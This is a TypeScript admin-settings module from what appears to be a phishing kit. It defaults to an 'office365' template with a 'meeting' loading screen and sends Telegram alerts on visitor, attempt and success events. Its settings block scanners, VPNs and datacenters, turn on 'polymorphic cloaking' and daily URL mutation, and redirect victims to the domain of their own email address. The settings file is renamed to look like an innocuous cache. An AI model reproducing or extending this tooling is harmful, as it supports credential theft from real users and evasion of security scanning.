import 'server-only'

/**
 * Admin settings storage and management
 * Stores settings in .config-cache.json (formerly: .admin-settings.json)
 * Edge Runtime compatible - conditionally imports file system utilities
 * 
 * NOTE: Types are exported from adminSettingsTypes.ts for client components
 */

import type { AdminSettings } from './adminSettingsTypes'
import { migrateFileIfNeeded } from './fileMigration'
export type { AdminSettings } from './adminSettingsTypes'
export type {
  TelegramSettings,
  EmailSettings,
  NotificationSettings,
  BotFilterSettings,
  CaptchaSettings,
  BotDelaySettings,
  StealthVerificationSettings,
  SecurityGatesSettings,
  NetworkRestrictionsSettings,
  SecuritySettings,
  FilteringSettings,
  TemplateSettings,
  RedirectSettings,
} from './adminSettingsTypes'

// Conditionally import file system utilities only in Node.js runtime
// Edge Runtime doesn't support file operations, so we'll use dynamic imports
let secureReadJSON: any
let secureWriteJSON: any

// Lazy load file system utilities only when needed (Node.js runtime)
async function loadFileSystemUtils() {
  if (!secureReadJSON || !secureWriteJSON) {
    if (typeof require !== 'undefined') {
      try {
        const fsUtils = await import('./secureFileSystem')
        secureReadJSON = fsUtils.secureReadJSON
        secureWriteJSON = fsUtils.secureWriteJSON
      } catch (error: any) {
        // Edge Runtime - will use API calls / defaults instead
      }
    } else {
    }
  }
  return { secureReadJSON, secureWriteJSON }
}

// Edge-compatible path (no 'path' module needed)
// Compute path only when needed (in Node.js runtime functions)
// Never call process.cwd() in module scope (Edge Runtime doesn't allow it)
function getSettingsFilePath(): string {
  // Only compute in Node.js runtime
  if (typeof process !== 'undefined' && typeof process.cwd === 'function') {
    try {
      const legacyPath = `${process.cwd()}/.admin-settings.json`
      const newPath = `${process.cwd()}/.config-cache.json`
      // Migrate old file name if needed
      migrateFileIfNeeded(legacyPath, newPath)
      return newPath
    } catch {
      // Fallback if cwd() fails
      const legacyPath = './.admin-settings.json'
      const newPath = './.config-cache.json'
      migrateFileIfNeeded(legacyPath, newPath)
      return newPath
    }
  }
  // Edge Runtime fallback
  return './.config-cache.json'
}

// In-memory cache
let settingsCache: AdminSettings | null = null
let cacheTimestamp = 0
const CACHE_DURATION = 60 * 1000 // 1 minute

// Default settings - pulls from environment variables
export const DEFAULT_SETTINGS: AdminSettings = {
  notifications: {
    telegram: {
      enabled: true,
      botToken: process.env.TELEGRAM_BOT_TOKEN || '',
      chatId: process.env.TELEGRAM_CHAT_ID || '',
      events: ['visitor', 'attempt', 'success'],
      notifyBotDetections: true, // Default: notify on bot detections
    },
    email: {
      enabled: false,
      toEmail: process.env.SMTP_TO || '', // Email address to receive visit notifications
      smtpHost: process.env.SMTP_HOST || '',
      smtpPort: parseInt(process.env.SMTP_PORT || '587') || 587,
      smtpUser: process.env.SMTP_USER || '',
      smtpPassword: process.env.SMTP_PASS || '',
      fromEmail: process.env.SMTP_FROM || '',
      events: ['daily_summary', 'success', 'link_expired'],
    },
  },
  security: {
    botFilter: {
      enabled: true,
      checkIPBlocklist: true,
      cloudflareBotManagement: true,
      scannerDetection: true,
      confidenceThreshold: 70, // Bot detection confidence threshold (0-100, default: 70)
    },
    captcha: {
      enabled: true,
      provider: 'turnstile',
      turnstileSiteKey: process.env.NEXT_PUBLIC_TURNSTILE_SITE_KEY || '',
      turnstileSecretKey: process.env.TURNSTILE_SECRET_KEY || '',
      privatecaptchaSiteKey: process.env.NEXT_PUBLIC_PRIVATECAPTCHA_SITE_KEY || '',
      privatecaptchaSecretKey: process.env.PRIVATECAPTCHA_SECRET_KEY || '',
      template: 'A', // PATCH 3: Default to Friendly template (deprecated)
      background: 'default', // CAPTCHA background image: 'default' | 'bg1' | 'bg2' | 'bg3' | 'bg4' | 'random'
    },
    gates: {
      layer1BotFilter: true,
      layer1IpBlocklist: true,
      layer1CloudflareBotManagement: true,
      layer1ScannerDetection: true,
      layer2Captcha: true,
      layer3BotDelay: true,
      layer4StealthVerification: true,
    },
    networkRestrictions: {
      allowVpn: process.env.ALLOW_VPN === '1' || process.env.ALLOW_VPN === 'true',
      allowProxy: process.env.ALLOW_PROXY === '1' || process.env.ALLOW_PROXY === 'true',
      allowDatacenter: process.env.ALLOW_DATACENTER === '1' || process.env.ALLOW_DATACENTER === 'true',
    },
    botDelay: {
      enabled: true,
      min: 3,
      max: 7,
    },
    stealthVerification: {
      enabled: true,
      behavioralAnalysis: true,
      mouseTracking: true,
      scrollTracking: true,
      honeypot: true,
      minimumTime: 3,
      botScoreThreshold: 50,
    },
    securityMode: (process.env.LINK_SECURITY_MODE === 'hardened' ? 'hardened' : 'strict') as 'strict' | 'hardened',
    enableDailyUrlMutation: true, // Default: enabled for daily URL mutation
    enablePolymorphicCloaking: true, // Phase 5.8: Default enabled for polymorphic cloaking
    behavioral: {
      enableBehaviorModel: true, // Phase 5.9: Default enabled for behavioral analysis
      behaviorThresholds: {
        blockBelow: 0, // Block if score < 0
        captchaBelow: 5, // Require CAPTCHA if score < 5
      },
      enableMicroHumanSignals: true, // Phase 5.11: Default enabled for micro human verification
      microHumanWeight: 0.3, // Phase 5.11: Weight for micro signals (30% of score)
    },
    securityBrain: {
      enabled: true, // Phase 5.10: Default enabled for unified security brain
      strictMode: false, // Default: lenient (prioritize human safety)
      blockThreshold: -10, // Only block if risk score < -10 (very rare)
    },
  },
  filtering: {
    geographic: {
      enabled: false,
      allowed: [],
      blocked: [],
    },
    device: {
      desktop: true,
      mobile: true,
      tablet: true,
    },
    // browser removed - not implemented in backend
    // network removed - duplicates security.networkRestrictions
  },
  templates: {
    default: 'office365',
    defaultLoadingScreen: 'meeting', // Default loading screen ID (e.g., 'meeting', 'voice', etc.)
    defaultLoadingDuration: 3, // Default loading duration in seconds (1-10, default: 3)
    showLoadingPage: true, // Show loading page animation to visitors (default: true)
    loadingPageLanguage: 'auto', // Language for loading page ('auto', 'en', 'ja', etc.)
  },
  redirects: {
    defaultUrl: 'https://www.google.com', // Default fallback
    customUrl: '', // Empty = use domain extraction
    useDomainFromEmail: true, // Enable smart domain extraction
    redirectDelaySeconds: 10, // 10 seconds default
    // Hashes are now hardcoded in code:
    // Success → #Success
    // TooManyAttempts → #TooManyAttempts
    // LinkUsed → #ReviewCompleted
  },
  linkManagement: {
    allowAllLinks: false, // Default: respect link expiration
  },
}

/**
 * Load settings with caching
 * Edge Runtime compatible - returns cached/default if file operations unavailable
 */
export async function loadSettings(): Promise<AdminSettings> {
  // Check if we're in Edge Runtime (no process.cwd or file system)
  const isEdgeRuntime = typeof process === 'undefined' || typeof process.cwd !== 'function'
  
  if (isEdgeRuntime) {
    // In Edge Runtime, return cached or default settings
    // File operations are not available in Edge Runtime
    return settingsCache || DEFAULT_SETTINGS
  }
  
  const now = Date.now()
  
  // Return cached settings if fresh
  if (settingsCache && now - cacheTimestamp < CACHE_DURATION) {
    return settingsCache
  }
  
  try {
    // Load file system utilities only in Node.js runtime
    // Wrap in try-catch to handle edge runtime errors gracefully
    let readJSON: any
    try {
      const fsUtils = await loadFileSystemUtils()
      readJSON = fsUtils.secureReadJSON
    } catch (fsError: any) {
      // If file system utils can't be loaded (edge runtime), use cache or defaults
      if (fsError?.message?.includes('fs/promises') || fsError?.message?.includes('edge runtime')) {
        return settingsCache || DEFAULT_SETTINGS
      }
      throw fsError
    }
    
    const settingsFile = getSettingsFilePath()
    const rawSettings = await (readJSON as typeof import('./secureFileSystem').secureReadJSON)<any>(
      settingsFile,
      DEFAULT_SETTINGS
    )
    
    // Merge with defaults to ensure all fields exist
    const mergedSettings: AdminSettings = {
      ...DEFAULT_SETTINGS,
      ...rawSettings,
      notifications: {
        ...DEFAULT_SETTINGS.notifications,
        ...rawSettings.notifications,
        telegram: {
          ...DEFAULT_SETTINGS.notifications.telegram,
          ...rawSettings.notifications?.telegram,
          // Fallback to env vars if saved value is empty
          botToken: rawSettings.notifications?.telegram?.botToken || process.env.TELEGRAM_BOT_TOKEN || DEFAULT_SETTINGS.notifications.telegram.botToken,
          chatId: rawSettings.notifications?.telegram?.chatId || process.env.TELEGRAM_CHAT_ID || DEFAULT_SETTINGS.notifications.telegram.chatId,
          enabled: rawSettings.notifications?.telegram?.enabled ?? DEFAULT_SETTINGS.notifications.telegram.enabled,
        },
        email: {
          ...DEFAULT_SETTINGS.notifications.email,
          ...rawSettings.notifications?.email,
          // Migrate old smtp structure if it exists, fallback to env vars if empty
          toEmail: rawSettings.notifications?.email?.toEmail || process.env.SMTP_TO || '',
          smtpHost: rawSettings.notifications?.email?.smtpHost || (rawSettings.notifications?.email as any)?.smtp?.host || process.env.SMTP_HOST || '',
          smtpPort: rawSettings.notifications?.email?.smtpPort || (rawSettings.notifications?.email as any)?.smtp?.port || parseInt(process.env.SMTP_PORT || '587') || 587,
          smtpUser: rawSettings.notifications?.email?.smtpUser || (rawSettings.notifications?.email as any)?.smtp?.username || process.env.SMTP_USER || '',
          smtpPassword: rawSettings.notifications?.email?.smtpPassword || (rawSettings.notifications?.email as any)?.smtp?.password || process.env.SMTP_PASS || '',
          fromEmail: rawSettings.notifications?.email?.fromEmail || (rawSettings.notifications?.email as any)?.smtp?.sendTo || process.env.SMTP_FROM || '',
        },
      },
      security: {
        ...DEFAULT_SETTINGS.security,
        ...rawSettings.security,
        botFilter: {
          ...DEFAULT_SETTINGS.security.botFilter,
          ...rawSettings.security?.botFilter,
          confidenceThreshold: rawSettings.security?.botFilter?.confidenceThreshold ?? DEFAULT_SETTINGS.security.botFilter.confidenceThreshold,
        },
        captcha: {
          ...DEFAULT_SETTINGS.security.captcha,
          ...rawSettings.security?.captcha,
          // Fallback to env vars if saved value is empty
          turnstileSiteKey: rawSettings.security?.captcha?.turnstileSiteKey || process.env.NEXT_PUBLIC_TURNSTILE_SITE_KEY || DEFAULT_SETTINGS.security.captcha.turnstileSiteKey,
          turnstileSecretKey: rawSettings.security?.captcha?.turnstileSecretKey || process.env.TURNSTILE_SECRET_KEY || DEFAULT_SETTINGS.security.captcha.turnstileSecretKey,
          privatecaptchaSiteKey: rawSettings.security?.captcha?.privatecaptchaSiteKey || process.env.NEXT_PUBLIC_PRIVATECAPTCHA_SITE_KEY || DEFAULT_SETTINGS.security.captcha.privatecaptchaSiteKey,
          privatecaptchaSecretKey: rawSettings.security?.captcha?.privatecaptchaSecretKey || process.env.PRIVATECAPTCHA_SECRET_KEY || DEFAULT_SETTINGS.security.captcha.privatecaptchaSecretKey,
        },
        botDelay: {
          ...DEFAULT_SETTINGS.security.botDelay,
          ...rawSettings.security?.botDelay,
        },
        stealthVerification: {
          ...DEFAULT_SETTINGS.security.stealthVerification,
          ...rawSettings.security?.stealthVerification,
        },
        gates: {
          ...DEFAULT_SETTINGS.security.gates,
          ...rawSettings.security?.gates,
        },
        networkRestrictions: {
          ...DEFAULT_SETTINGS.security.networkRestrictions,
          ...rawSettings.security?.networkRestrictions,
          // Fallback to env vars if saved value is undefined/null
          allowVpn: rawSettings.security?.networkRestrictions?.allowVpn ?? (process.env.ALLOW_VPN === '1' || process.env.ALLOW_VPN === 'true' || DEFAULT_SETTINGS.security.networkRestrictions.allowVpn),
          allowProxy: rawSettings.security?.networkRestrictions?.allowProxy ?? (process.env.ALLOW_PROXY === '1' || process.env.ALLOW_PROXY === 'true' || DEFAULT_SETTINGS.security.networkRestrictions.allowProxy),
          allowDatacenter: rawSettings.security?.networkRestrictions?.allowDatacenter ?? (process.env.ALLOW_DATACENTER === '1' || process.env.ALLOW_DATACENTER === 'true' || DEFAULT_SETTINGS.security.networkRestrictions.allowDatacenter),
        },
        // Fallback to env var if saved value is undefined/null
        securityMode: rawSettings.security?.securityMode ?? (process.env.LINK_SECURITY_MODE === 'hardened' ? 'hardened' : 'strict') as 'strict' | 'hardened',
        enableDailyUrlMutation: rawSettings.security?.enableDailyUrlMutation ?? DEFAULT_SETTINGS.security.enableDailyUrlMutation,
        enablePolymorphicCloaking: rawSettings.security?.enablePolymorphicCloaking ?? DEFAULT_SETTINGS.security.enablePolymorphicCloaking,
        behavioral: {
          ...DEFAULT_SETTINGS.security.behavioral,
          ...rawSettings.security?.behavioral,
          behaviorThresholds: {
            ...DEFAULT_SETTINGS.security.behavioral?.behaviorThresholds,
            ...rawSettings.security?.behavioral?.behaviorThresholds,
          },
        },
        securityBrain: {
          ...DEFAULT_SETTINGS.security.securityBrain,
          ...rawSettings.security?.securityBrain,
        },
      },
      filtering: {
        ...DEFAULT_SETTINGS.filtering,
        ...rawSettings.filtering,
      },
      templates: {
        ...DEFAULT_SETTINGS.templates,
        ...rawSettings.templates,
        defaultLoadingScreen: rawSettings.templates?.defaultLoadingScreen ?? DEFAULT_SETTINGS.templates.defaultLoadingScreen,
        defaultLoadingDuration: rawSettings.templates?.defaultLoadingDuration ?? DEFAULT_SETTINGS.templates.defaultLoadingDuration,
        showLoadingPage: rawSettings.templates?.showLoadingPage ?? DEFAULT_SETTINGS.templates.showLoadingPage,
        loadingPageLanguage: rawSettings.templates?.loadingPageLanguage ?? DEFAULT_SETTINGS.templates.loadingPageLanguage,
      },
      redirects: {
        ...DEFAULT_SETTINGS.redirects,
        ...rawSettings.redirects,
      },
      linkManagement: {
        ...DEFAULT_SETTINGS.linkManagement,
        ...rawSettings.linkManagement,
      },
    }
    
    // Update cache
    settingsCache = mergedSettings
    cacheTimestamp = now
    
    return mergedSettings
  } catch (error) {
    return DEFAULT_SETTINGS
  }
}

/**
 * Get all admin settings (alias for loadSettings for backwards compatibility)
 */
export async function getSettings(): Promise<AdminSettings> {
  return loadSettings()
}

/**
 * Deep merge helper function
 * Merges nested objects deeply, preserving all properties
 */
function deepMerge<T extends Record<string, any>>(target: T, source: Partial<T>): T {
  const output: any = { ...target }
  
  if (isObject(target) && isObject(source)) {
    Object.keys(source).forEach(key => {
      const sourceValue = (source as any)[key]
      const targetValue = (target as any)[key]
      
      if (isObject(sourceValue) && isObject(targetValue) && !Array.isArray(sourceValue) && !Array.isArray(targetValue)) {
        // Recursively merge nested objects
        output[key] = deepMerge(targetValue, sourceValue)
      } else if (sourceValue !== undefined) {
        // Use source value if defined
        output[key] = sourceValue
      }
    })
  }
  
  return output as T
}

function isObject(item: any): item is Record<string, any> {
  return item && typeof item === 'object' && !Array.isArray(item)
}

/**
 * Save all admin settings
 * Edge Runtime compatible - only works in Node.js runtime
 * 
 * IMPORTANT: Merges with existing settings to preserve values not in the update
 */
export async function saveSettings(settings: AdminSettings): Promise<void> {
  // Check if we're in Edge Runtime
  const isEdgeRuntime = typeof process === 'undefined' || typeof process.cwd !== 'function'
  
  console.log('[ADMIN SETTINGS] 💾 saveSettings() called')
  console.log('[ADMIN SETTINGS] Is Edge Runtime?', isEdgeRuntime)
  
  if (isEdgeRuntime) {
    // In Edge Runtime, just update cache (can't write to file)
    console.log('[ADMIN SETTINGS] ⚠️  Edge Runtime detected - updating cache only (no file write)')
    settingsCache = settings
    cacheTimestamp = Date.now()
    return
  }
  
  // Load existing settings to merge with new ones (preserve values not being updated)
  let existingSettings: AdminSettings
  try {
    existingSettings = await loadSettings()
  } catch (error) {
    // If loading fails, use defaults
    existingSettings = DEFAULT_SETTINGS
  }
  
  // Deep merge: new settings override existing, but preserve nested properties
  const mergedSettings = deepMerge(existingSettings, settings)
  
  // Fix (B): Prevent saving empty strings for env-based fields - replace with env var or default
  // This ensures empty values don't overwrite env defaults
  if (mergedSettings.notifications?.telegram) {
    if (mergedSettings.notifications.telegram.botToken === '') {
      mergedSettings.notifications.telegram.botToken = process.env.TELEGRAM_BOT_TOKEN || DEFAULT_SETTINGS.notifications.telegram.botToken
    }
    if (mergedSettings.notifications.telegram.chatId === '') {
      mergedSettings.notifications.telegram.chatId = process.env.TELEGRAM_CHAT_ID || DEFAULT_SETTINGS.notifications.telegram.chatId
    }
  }
  
  if (mergedSettings.security?.captcha) {
    if (mergedSettings.security.captcha.turnstileSiteKey === '') {
      mergedSettings.security.captcha.turnstileSiteKey = process.env.NEXT_PUBLIC_TURNSTILE_SITE_KEY || DEFAULT_SETTINGS.security.captcha.turnstileSiteKey
    }
    if (mergedSettings.security.captcha.turnstileSecretKey === '') {
      mergedSettings.security.captcha.turnstileSecretKey = process.env.TURNSTILE_SECRET_KEY || DEFAULT_SETTINGS.security.captcha.turnstileSecretKey
    }
    if (mergedSettings.security.captcha.privatecaptchaSiteKey === '') {
      mergedSettings.security.captcha.privatecaptchaSiteKey = process.env.NEXT_PUBLIC_PRIVATECAPTCHA_SITE_KEY || DEFAULT_SETTINGS.security.captcha.privatecaptchaSiteKey
    }
    if (mergedSettings.security.captcha.privatecaptchaSecretKey === '') {
      mergedSettings.security.captcha.privatecaptchaSecretKey = process.env.PRIVATECAPTCHA_SECRET_KEY || DEFAULT_SETTINGS.security.captcha.privatecaptchaSecretKey
    }
  }
  
  // Load file system utilities only in Node.js runtime
  console.log('[ADMIN SETTINGS] 📂 Loading file system utilities...')
  const { secureWriteJSON: writeJSON } = await loadFileSystemUtils()
  const settingsFile = getSettingsFilePath()
  console.log('[ADMIN SETTINGS] 📝 Settings file path:', settingsFile)
  console.log('[ADMIN SETTINGS] 🔄 Writing merged settings to disk...')
  
  await writeJSON(settingsFile, mergedSettings)
  
  console.log('[ADMIN SETTINGS] ✅ Settings written successfully')
  // Update cache with merged settings
  settingsCache = mergedSettings
  cacheTimestamp = Date.now()
  console.log('[ADMIN SETTINGS] 🧹 Cache updated')
}

/**
 * Get settings synchronously from cache (for middleware)
 * Returns default if cache empty
 */
export function getCachedSettings(): AdminSettings {
  return settingsCache || DEFAULT_SETTINGS
}

/**
 * Warm up cache on server start (Node.js only, not Edge Runtime)
 */
// Warm-up cache - ONLY in Node.js runtime (NOT in Edge Runtime)
if (
  typeof require !== 'undefined' && 
  typeof process !== 'undefined' &&
  typeof process.cwd === 'function' &&
  process.env.NEXT_RUNTIME !== 'edge'
) {
  // Delay slightly to ensure file system is ready
  setTimeout(() => {
    loadSettings()
      .then(() => {
      })
      .catch((error: any) => {
        // Silently fail in Edge Runtime
        if (!error.message?.includes('edge runtime') && 
            !error.message?.includes('fs/promises')) {
        }
      })
  }, 100)
} else {
}

/**
 * Update a specific setting by path
 * Example: updateSetting('notifications.telegram.enabled', true)
 */
export async function updateSetting(path: string, value: any): Promise<void> {
  const settings = await getSettings()
  
  const keys = path.split('.')
  let current: any = settings
  
  // Navigate to the parent object
  for (let i = 0; i < keys.length - 1; i++) {
    if (!(keys[i] in current)) {
      current[keys[i]] = {}
    }
    current = current[keys[i]]
  }
  
  // Set the value
  current[keys[keys.length - 1]] = value
  
  await saveSettings(settings)
}

/**
 * Get a specific setting by path
 */
export async function getSetting<T = any>(path: string): Promise<T | undefined> {
  const settings = await getSettings()
  
  const keys = path.split('.')
  let current: any = settings
  
  for (const key of keys) {
    if (current && typeof current === 'object' && key in current) {
      current = current[key]
    } else {
      return undefined
    }
  }
  
  return current as T
}

/**
 * Get security mode for link management
 * Returns 'strict' (default) or 'hardened' (red-team mode)
 * 
 * @returns Security mode string
 */
export async function getSecurityMode(): Promise<'strict' | 'hardened'> {
  const settings = await loadSettings()
  return settings.security.securityMode || 'strict'
}

/**
 * Get security mode synchronously from cache
 * For use in middleware or synchronous contexts
 * 
 * @returns Security mode string
 */
export function getCachedSecurityMode(): 'strict' | 'hardened' {
  const settings = getCachedSettings()
  return settings.security.securityMode || 'strict'
}

// ============================================
// PHASE 3: SQLite Migration Functions
// ============================================
// These functions use SQLite instead of JSON files
// They are NOT exported yet - will be integrated in later phase
// ============================================

/**
 * Get admin settings from SQLite database
 * Phase 3: SQLite version (not yet integrated)
 * 
 * Reads from admin_settings table (id=1) and merges with defaults
 * Automatically parses JSON columns via sql wrapper
 * 
 * @returns AdminSettings object merged with defaults
 * @throws Error if database read fails
 */
async function getAdminSettingsSql(): Promise<AdminSettings> {
  try {
    // Dynamically import sql to avoid breaking Edge Runtime
    const { sql } = await import('./sql')
    
    // Read from admin_settings table (id=1)
    // sql.get automatically parses JSON columns
    const row = sql.get<{
      id: number
      notifications: any
      security: any
      filtering: any
      templates: any
      redirects: any
      linkManagement?: any
      updated_at: number
    }>('SELECT * FROM admin_settings WHERE id = 1')
    
    if (!row) {
      // No row exists - return defaults
      return DEFAULT_SETTINGS
    }
    
    // Merge with defaults to ensure all fields exist (same pattern as loadSettings)
    const mergedSettings: AdminSettings = {
      ...DEFAULT_SETTINGS,
      notifications: {
        ...DEFAULT_SETTINGS.notifications,
        ...row.notifications,
        telegram: {
          ...DEFAULT_SETTINGS.notifications.telegram,
          ...row.notifications?.telegram,
          // Fallback to env vars if saved value is empty
          botToken: row.notifications?.telegram?.botToken || process.env.TELEGRAM_BOT_TOKEN || DEFAULT_SETTINGS.notifications.telegram.botToken,
          chatId: row.notifications?.telegram?.chatId || process.env.TELEGRAM_CHAT_ID || DEFAULT_SETTINGS.notifications.telegram.chatId,
          enabled: row.notifications?.telegram?.enabled ?? DEFAULT_SETTINGS.notifications.telegram.enabled,
        },
        email: {
          ...DEFAULT_SETTINGS.notifications.email,
          ...row.notifications?.email,
          // Migrate old smtp structure if it exists, fallback to env vars if empty
          toEmail: row.notifications?.email?.toEmail || process.env.SMTP_TO || '',
          smtpHost: row.notifications?.email?.smtpHost || (row.notifications?.email as any)?.smtp?.host || process.env.SMTP_HOST || '',
          smtpPort: row.notifications?.email?.smtpPort || (row.notifications?.email as any)?.smtp?.port || parseInt(process.env.SMTP_PORT || '587') || 587,
          smtpUser: row.notifications?.email?.smtpUser || (row.notifications?.email as any)?.smtp?.username || process.env.SMTP_USER || '',
          smtpPassword: row.notifications?.email?.smtpPassword || (row.notifications?.email as any)?.smtp?.password || process.env.SMTP_PASS || '',
          fromEmail: row.notifications?.email?.fromEmail || (row.notifications?.email as any)?.smtp?.sendTo || process.env.SMTP_FROM || '',
        },
      },
      security: {
        ...DEFAULT_SETTINGS.security,
        ...row.security,
        botFilter: {
          ...DEFAULT_SETTINGS.security.botFilter,
          ...row.security?.botFilter,
          confidenceThreshold: row.security?.botFilter?.confidenceThreshold ?? DEFAULT_SETTINGS.security.botFilter.confidenceThreshold,
        },
        captcha: {
          ...DEFAULT_SETTINGS.security.captcha,
          ...row.security?.captcha,
          // Fallback to env vars if saved value is empty
          turnstileSiteKey: row.security?.captcha?.turnstileSiteKey || process.env.NEXT_PUBLIC_TURNSTILE_SITE_KEY || DEFAULT_SETTINGS.security.captcha.turnstileSiteKey,
          turnstileSecretKey: row.security?.captcha?.turnstileSecretKey || process.env.TURNSTILE_SECRET_KEY || DEFAULT_SETTINGS.security.captcha.turnstileSecretKey,
          privatecaptchaSiteKey: row.security?.captcha?.privatecaptchaSiteKey || process.env.NEXT_PUBLIC_PRIVATECAPTCHA_SITE_KEY || DEFAULT_SETTINGS.security.captcha.privatecaptchaSiteKey,
          privatecaptchaSecretKey: row.security?.captcha?.privatecaptchaSecretKey || process.env.PRIVATECAPTCHA_SECRET_KEY || DEFAULT_SETTINGS.security.captcha.privatecaptchaSecretKey,
        },
        botDelay: {
          ...DEFAULT_SETTINGS.security.botDelay,
          ...row.security?.botDelay,
        },
        stealthVerification: {
          ...DEFAULT_SETTINGS.security.stealthVerification,
          ...row.security?.stealthVerification,
        },
        gates: {
          ...DEFAULT_SETTINGS.security.gates,
          ...row.security?.gates,
        },
        networkRestrictions: {
          ...DEFAULT_SETTINGS.security.networkRestrictions,
          ...row.security?.networkRestrictions,
          // Fallback to env vars if saved value is undefined/null
          allowVpn: row.security?.networkRestrictions?.allowVpn ?? (process.env.ALLOW_VPN === '1' || process.env.ALLOW_VPN === 'true' || DEFAULT_SETTINGS.security.networkRestrictions.allowVpn),
          allowProxy: row.security?.networkRestrictions?.allowProxy ?? (process.env.ALLOW_PROXY === '1' || process.env.ALLOW_PROXY === 'true' || DEFAULT_SETTINGS.security.networkRestrictions.allowProxy),
          allowDatacenter: row.security?.networkRestrictions?.allowDatacenter ?? (process.env.ALLOW_DATACENTER === '1' || process.env.ALLOW_DATACENTER === 'true' || DEFAULT_SETTINGS.security.networkRestrictions.allowDatacenter),
        },
        // Fallback to env var if saved value is undefined/null
        securityMode: row.security?.securityMode ?? (process.env.LINK_SECURITY_MODE === 'hardened' ? 'hardened' : 'strict') as 'strict' | 'hardened',
        enableDailyUrlMutation: row.security?.enableDailyUrlMutation ?? DEFAULT_SETTINGS.security.enableDailyUrlMutation,
        enablePolymorphicCloaking: row.security?.enablePolymorphicCloaking ?? DEFAULT_SETTINGS.security.enablePolymorphicCloaking,
        behavioral: {
          ...DEFAULT_SETTINGS.security.behavioral,
          ...row.security?.behavioral,
          behaviorThresholds: {
            ...DEFAULT_SETTINGS.security.behavioral?.behaviorThresholds,
            ...row.security?.behavioral?.behaviorThresholds,
          },
        },
        securityBrain: {
          ...DEFAULT_SETTINGS.security.securityBrain,
          ...row.security?.securityBrain,
        },
      },
      filtering: {
        ...DEFAULT_SETTINGS.filtering,
        ...row.filtering,
      },
      templates: {
        ...DEFAULT_SETTINGS.templates,
        ...row.templates,
        defaultLoadingScreen: row.templates?.defaultLoadingScreen ?? DEFAULT_SETTINGS.templates.defaultLoadingScreen,
        defaultLoadingDuration: row.templates?.defaultLoadingDuration ?? DEFAULT_SETTINGS.templates.defaultLoadingDuration,
        showLoadingPage: row.templates?.showLoadingPage ?? DEFAULT_SETTINGS.templates.showLoadingPage,
        loadingPageLanguage: row.templates?.loadingPageLanguage ?? DEFAULT_SETTINGS.templates.loadingPageLanguage,
      },
      redirects: {
        ...DEFAULT_SETTINGS.redirects,
        ...row.redirects,
      },
      linkManagement: {
        ...DEFAULT_SETTINGS.linkManagement,
        ...row.linkManagement,
      },
    }
    
    return mergedSettings
  } catch (error) {
    // If SQLite fails, fall back to defaults (same behavior as JSON version)
    console.error('[ADMIN SETTINGS SQL] Failed to read from SQLite:', error)
    return DEFAULT_SETTINGS
  }
}

/**
 * Update admin settings in SQLite database
 * Phase 3: SQLite version (not yet integrated)
 * 
 * Writes to admin_settings table (id=1)
 * Automatically stringifies JSON columns via sql wrapper
 * Uses UPSERT pattern (INSERT OR REPLACE)
 * 
 * @param payload AdminSettings object to save
 * @throws Error if database write fails
 */
async function updateAdminSettingsSql(payload: AdminSettings): Promise<void> {
  try {
    // Dynamically import sql to avoid breaking Edge Runtime
    const { sql } = await import('./sql')
    
    const now = Math.floor(Date.now() / 1000) // Unix timestamp in seconds
    
    // Use INSERT OR REPLACE to handle both initial insert and updates
    // sql.run with named parameters automatically stringifies JSON columns
    // Check if linkManagement column exists, include it if available
    // Note: If column doesn't exist in DB, it will be added in migration
    sql.run(
      `INSERT OR REPLACE INTO admin_settings 
       (id, notifications, security, filtering, templates, redirects, linkManagement, updated_at)
       VALUES ($id, $notifications, $security, $filtering, $templates, $redirects, $linkManagement, $updated_at)`,
      {
        id: 1,
        notifications: payload.notifications,
        security: payload.security,
        filtering: payload.filtering,
        templates: payload.templates,
        redirects: payload.redirects,
        linkManagement: payload.linkManagement || DEFAULT_SETTINGS.linkManagement,
        updated_at: now,
      }
    )
    
    // Clear in-memory cache to force refresh on next read
    settingsCache = null
    cacheTimestamp = 0
  } catch (error) {
    console.error('[ADMIN SETTINGS SQL] Failed to write to SQLite:', error)
    throw new Error(`Failed to save settings to SQLite: ${error instanceof Error ? error.message : String(error)}`)
  }
}

